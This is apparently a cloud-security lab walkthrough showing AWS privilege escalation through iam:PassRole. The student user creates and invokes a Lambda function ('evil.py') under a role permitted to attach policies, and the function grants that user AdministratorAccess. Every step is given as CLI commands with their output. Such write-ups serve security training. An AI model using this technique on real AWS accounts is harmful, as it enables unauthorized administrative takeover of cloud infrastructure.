# Pass Role: Lambda

Overly Permissive Permission can be abused by a user to perform privileged operations.

Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account.

----

The `student` user has the inline policy to allow `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction`, `lambda:List*`, `lambda:Get*` and `lambda:Update*` actions. Hence, student can pass an existing role to a Lambda function.

If such a role exists which can be passed to Lambda and has enough permissions to help escalate, that would solve the lab. 

```text
cat account_authorization_details | jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service=="lambda.amazonaws.com")'
```

1. Check lab11lambdaiam role details:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-role --role-name lab11lambdaiam
{
    "Role": {
        "Path": "/",
        "RoleName": "lab11lambdaiam",
        "RoleId": "AROA5Y7OCKXMHLTO5WESW",
        "Arn": "arn:aws:iam::947002693080:role/lab11lambdaiam",
        "CreateDate": "2023-05-12T14:10:51+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {}
    }
}

┌──(kali㉿kali)-[~]
└─$ aws iam list-role-policies --role-name lab11lambdaiam
{
    "PolicyNames": [
        "terraform-20230512141051960700000003"
    ]
}

┌──(kali㉿kali)-[~]
└─$ aws iam get-role-policy --role-name lab11lambdaiam --policy-name terraform-20230512141051960700000003
{
    "RoleName": "lab11lambdaiam",
    "PolicyName": "terraform-20230512141051960700000003",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:AttachUserPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
```

2. Create a python script with the following content

***Python Script: evil.py***

```python
import boto3


def handler():
    iam = boto3.client("iam")
    response = iam.attach_user_policy(
        UserName="student", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

3. Zip the python script using zip:

```text
┌──(kali㉿kali)-[~]
└─$ zip evil-function.zip evil.py
  adding: evil.py (deflated 28%)
```

4. Create a lambda function on AWS account:

```text
┌──(kali㉿kali)-[~]
└─$ aws lambda create-function \
--function-name evil-function \
--runtime python3.8 \
--zip-file fileb://evil-function.zip \
--handler evil.handler \
--role arn:aws:iam::947002693080:role/lab11lambdaiam
{
    "FunctionName": "evil-function",
    "FunctionArn": "arn:aws:lambda:us-east-1:947002693080:function:evil-function",
    "Runtime": "python3.8",
    "Role": "arn:aws:iam::947002693080:role/lab11lambdaiam",
    "Handler": "evil.handler",
    "CodeSize": 314,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2023-05-12T14:25:56.749+0000",
    "CodeSha256": "XLvcjDh044rFfFrPBHuvkNwDB107ntWqcMm29WXrNCM=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "f9de5359-7875-40a7-ab20-d11af815dcfb",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    },
    "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
    },
    "RuntimeVersionConfig": {
        "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:48ae60ef4cd46a5f33291797e798b3aaefe09e5000e8f58c605db8540c47dd8d"
    }
}
```

5. Invoke the newly created Lambda function:

```text
┌──(kali㉿kali)-[~]
└─$ aws lambda invoke --function-name evil-function invoke_out.txt
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

6. Check attached policies on student user:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name student
```

Successfully attached `AdministratorAccess` policy to the student user.

7. Try creating a new user on the AWS account:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob
```
